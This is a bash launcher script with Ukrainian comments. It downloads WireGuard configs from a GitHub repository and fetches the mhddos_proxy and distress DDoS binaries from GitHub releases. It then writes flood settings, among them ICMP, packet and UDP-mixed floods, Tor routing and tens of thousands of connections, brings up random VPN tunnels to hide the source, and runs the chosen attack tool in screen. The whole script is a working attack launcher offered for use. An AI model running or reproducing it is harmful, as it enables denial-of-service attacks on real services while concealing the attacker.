#!/bin/bash

set -e

#=== Підготовка середовища ===
echo "[+] Перевірка та встановлення необхідних пакетів..."
PKGS=(curl wget git screen sed)

if command -v apt-get >/dev/null 2>&1; then
    PKG_MANAGER="apt-get"
elif command -v yum >/dev/null 2>&1; then
    PKG_MANAGER="yum"
else
    echo "[-] Не знайдено підтримуваного пакетного менеджера."
    exit 1
fi

for pkg in "${PKGS[@]}"; do
    if ! command -v "$pkg" >/dev/null 2>&1; then
        echo "[+] Встановлення: $pkg"
        sudo $PKG_MANAGER install -y "$pkg"
    fi
done

#=== Створення папок ===
echo "[+] Підготовка папок..."
MODULE_DIR="$HOME/modules"
WG_DIR="$HOME/wg_confs"
mkdir -p "$MODULE_DIR" "$WG_DIR"

SCRIPT_PATH="$(realpath "$0")"
WG_REPO_HTML="https://github.com/k7771/Kaljan747/tree/k7771/wg"
WG_RAW_BASE="https://raw.githubusercontent.com/k7771/Kaljan747/k7771/wg"

#=== Завантаження WG-конфігів ===
echo "[+] Завантаження WG-конфігів..."
CONF_LIST=$(curl -s "$WG_REPO_HTML" | grep -oP '(?<=href=").*?\.conf(?=")' | grep '/k7771/Kaljan747/blob/' | sed 's|^/|https://github.com/|g' | sed 's|blob/|raw/|' | sed "s|https://github.com/k7771/Kaljan747/raw/k7771/wg/|$WG_RAW_BASE/|g" | grep -E '\.conf$')

for url in $CONF_LIST; do
    file=$(basename "$url")
    if [[ "$file" =~ ^[a-zA-Z0-9._-]+\.conf$ ]]; then
        wget -qO "$WG_DIR/$file" "$url" && echo "[+] Завантажено: $file"
    fi
done

chmod 600 "$WG_DIR"/*.conf 2>/dev/null || true

#=== Створення .ini файлів ===
echo "[+] Створення .ini файлів..."
INI1="$MODULE_DIR/mhddos.ini"
INI2="$MODULE_DIR/distress.ini"

if [ ! -f "$INI1" ]; then
  echo "--use-my-ip 0 --copies auto -t 8000" > "$INI1"
  echo "[+] Створено mhddos.ini"
fi

if [ ! -f "$INI2" ]; then
  echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000" > "$INI2"
  echo "[+] Створено distress.ini"
fi

#=== Завантаження модулів ===
echo "[+] Завантаження модулів..."
[ -f "$MODULE_DIR/mhddos_proxy" ] || wget -qO "$MODULE_DIR/mhddos_proxy" https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux
[ -f "$MODULE_DIR/distress" ] || wget -qO "$MODULE_DIR/distress" https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl

chmod +x "$MODULE_DIR/mhddos_proxy" "$MODULE_DIR/distress"

#=== Рандомний вибір WG-конфігів ===
echo "[+] Випадковий вибір 4 WireGuard конфігів..."
WG_FILES=($(find "$WG_DIR" -name "*.conf" -type f | shuf | head -n 4))
WG_IFACES=()

if command -v wg-quick >/dev/null 2>&1; then
    for conf in "${WG_FILES[@]}"; do
        IFACE_NAME=$(basename "$conf" .conf)
        if wg show "$IFACE_NAME" >/dev/null 2>&1; then
            wg-quick down "$conf" && echo "[-] Перезапущено: $IFACE_NAME"
        fi
        if [ -f "$conf" ]; then
            wg-quick up "$conf" && echo "[+] Підключено: $conf"
            WG_IFACES+=("$IFACE_NAME")
        fi
    done
else
    echo "[-] wg-quick не знайдено. Пропускаємо тунелі."
fi

#=== Вибір модуля ===
CONFIG_CHOICE_FILE="$HOME/last_module_choice.txt"
INTERACTIVE=false

if [[ ! -s "$CONFIG_CHOICE_FILE" ]]; then
    echo "[?] Виберіть модуль:"
    echo "1 - mhddos_proxy"
    echo "2 - distress"
    read -p "[1/2]: " module_choice
    echo "$module_choice" > "$CONFIG_CHOICE_FILE"
    INTERACTIVE=true
else
    module_choice=$(cat "$CONFIG_CHOICE_FILE")
fi

case $module_choice in
    1)
        MODULE="$MODULE_DIR/mhddos_proxy"
        CONFIG_FILE="$INI1"
        MODULE_NAME="mhddos"
        ;;
    2)
        MODULE="$MODULE_DIR/distress"
        CONFIG_FILE="$INI2"
        MODULE_NAME="distress"
        ;;
    *)
        echo "[-] Невірний вибір модуля"
        exit 1
        ;;
esac

#=== Параметри запуску модуля ===
ARGS=$(cat "$CONFIG_FILE")

#=== Вибір способу запуску ===
RUN_MODE_FILE="$HOME/last_run_mode.txt"
if [[ ! -s "$RUN_MODE_FILE" ]]; then
    echo "[?] Виберіть спосіб запуску:"
    echo "1 - screen у фоні"
    echo "2 - screen з виводом"
    echo "3 - без screen у терміналі"
    read -p "[1/2/3]: " run_mode
    echo "$run_mode" > "$RUN_MODE_FILE"
else
    run_mode=$(cat "$RUN_MODE_FILE")
fi

if [[ $run_mode == "1" ]]; then
    screen -dmS "$MODULE_NAME" $MODULE $ARGS
    echo "[+] $MODULE_NAME запущено у screen (фон)."
elif [[ $run_mode == "2" ]]; then
    echo "[+] Запуск $MODULE_NAME у screen..."
    screen -S "$MODULE_NAME" $MODULE $ARGS
elif [[ $run_mode == "3" ]]; then
    echo "[+] Запуск $MODULE_NAME без screen у цьому терміналі..."
    $MODULE $ARGS
else
    echo "[-] Невірний вибір запуску."
    exit 1
fi

#=== Завершення ===
trap 'echo "[!] Скрипт зупинено вручну. Видаляємо last_module_choice.txt..."; rm -f "$CONFIG_CHOICE_FILE" "$RUN_MODE_FILE"; exit 0' INT
